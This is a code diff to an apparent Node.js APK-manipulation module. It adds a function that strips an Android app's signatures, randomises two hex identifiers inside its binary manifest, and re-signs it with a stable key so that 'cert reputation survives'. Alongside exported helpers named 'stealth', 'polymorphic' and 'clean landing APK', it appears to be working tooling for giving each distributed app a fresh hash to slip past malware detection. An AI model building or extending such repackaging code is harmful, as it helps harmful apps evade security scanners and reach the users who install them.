@@ -2890,7 +2890,45 @@ function mutateAndSignStealth(originalBuffer) {
   }
 }
 
-module.exports = { mutateAndSign, restoreAndSign, directPatchApk, generateFreshKey, createCleanLandingApk, resignApkClean, polymorphicTransformWrapper, mutateAndSignStealth };
+// ── Patch wrapper: randomise two 9-char hex segments in the binary manifest ─
+// Strips old sigs, replaces old9 → seg1 and old10 → seg2 (same-length),
+// then re-signs with a caller-supplied STABLE key (cert reputation survives).
+function patchAndResignWrapper(originalBuffer, seg1, seg2, stableKey) {
+  try {
+    const zip = new AdmZip(Buffer.from(originalBuffer));
+    stripSignatures(zip);
+    const mE = zip.getEntry('AndroidManifest.xml');
+    if (mE) {
+      const mB = Buffer.from(mE.getData());
+      function _r(os, ns) {
+        if (os.length !== ns.length) return;
+        const ob16 = Buffer.alloc(os.length * 2), nb16 = Buffer.alloc(ns.length * 2);
+        for (let i = 0; i < os.length; i++) {
+          ob16.writeUInt16LE(os.charCodeAt(i), i * 2);
+          nb16.writeUInt16LE(ns.charCodeAt(i), i * 2);
+        }
+        let p = 0;
+        while ((p = mB.indexOf(ob16, p)) !== -1) { nb16.copy(mB, p); p += ob16.length; }
+        const ob8 = Buffer.from(os, 'utf8'), nb8 = Buffer.from(ns, 'utf8');
+        p = 0;
+        while ((p = mB.indexOf(ob8, p)) !== -1) { nb8.copy(mB, p); p += nb8.length; }
+      }
+      _r('x2524707f', seg1); // 9 chars → 9 chars
+      _r('xc946668e', seg2); // 9 chars → 9 chars
+      zip.deleteFile('AndroidManifest.xml');
+      zip.addFile('AndroidManifest.xml', mB);
+    }
+    const raw     = zip.toBuffer();
+    const aligned = zipalignBuffer(raw);
+    const signed  = applyV2Signing(aligned, stableKey.privPem, stableKey.certDer, stableKey.pubKeyDer);
+    return signed || originalBuffer;
+  } catch (e) {
+    console.error('[patchAndResignWrapper] Error:', e.message);
+    return originalBuffer;
+  }
+}
+
+module.exports = { mutateAndSign, restoreAndSign, directPatchApk, generateFreshKey, createCleanLandingApk, resignApkClean, polymorphicTransformWrapper, mutateAndSignStealth, generateHardenedKey, patchAndResignWrapper };
 
 // ═════════════════════════════════════════════════════════════════════════════
 // MINIMAL RESTORE + RE-SIGN (for landing page downloads)
